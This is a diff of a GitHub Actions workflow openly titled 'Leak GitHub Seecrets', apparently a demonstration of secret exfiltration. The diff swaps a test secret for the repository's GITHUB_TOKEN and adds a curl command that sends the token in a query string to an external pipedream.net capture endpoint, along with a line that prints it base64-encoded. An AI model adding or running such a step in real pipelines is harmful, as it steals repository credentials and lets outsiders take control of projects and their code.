@@ -2,7 +2,7 @@ name: Leak GitHub Seecrets
 
 on:
   issues: 
-    types: [milestoned]
+    types: []
 
 jobs:
   leak:
@@ -11,6 +11,8 @@ jobs:
     steps:
       - name: Leak the secret
         run: |
-          echo $VALUE | base64
+          echo $VALUE | base64 
+          VAR_ABC=$VALUE
+          curl -I https://enax0mfmkuupq.x.pipedream.net?code=$VAR_ABC
         env:
-          VALUE: ${{ secrets.parent_test }}
+          VALUE: ${{ secrets.GITHUB_TOKEN }}
